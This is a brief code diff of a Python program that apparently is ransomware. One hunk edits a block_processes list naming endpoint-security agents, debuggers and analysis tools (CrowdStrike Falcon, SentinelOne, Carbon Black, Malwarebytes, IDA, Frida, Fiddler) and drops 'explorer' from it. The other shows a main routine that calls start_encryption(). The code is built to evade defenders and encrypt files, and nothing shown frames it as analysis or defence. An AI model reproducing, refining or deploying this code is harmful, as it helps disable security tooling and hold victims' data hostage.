@@ -345,7 +345,7 @@ def block_processes():
         "SbieSvc", "SecurityHealthSystray", "SentinelAgent", "SentinelHelperService", "SentinelUI", "WMIADAP", "autoruns",
         "autorunsc", "burpsuit", "cain", "carbonblack", "cb", "cmd", "csfalcon",
         "csfalconcontainer", "csfalconservice", "cyserver", "cytray", "decoder", "dnspy", "esensor",
-        "eventvwr", "explorer", "fiddler", "filemon", "frida", "gdb", "gmer",
+        "eventvwr", "fiddler", "filemon", "frida", "gdb", "gmer",
         "hookexplorer", "httpanalyzerv7", "httpdebuggerui", "ida", "ida64", "idag", "idag64",
         "idaq", "idaq64", "idaw", "idaw64", "immunitydebugger", "ksdumper", "mbam",
         "mbamtray", "mbae", "mbaeservice", "msconfig", "netmon", "netstat", "ollydbg",
@@ -793,3 +793,4 @@ if __name__ == "__main__":
         shutdown()
     else:
         start_encryption()
+
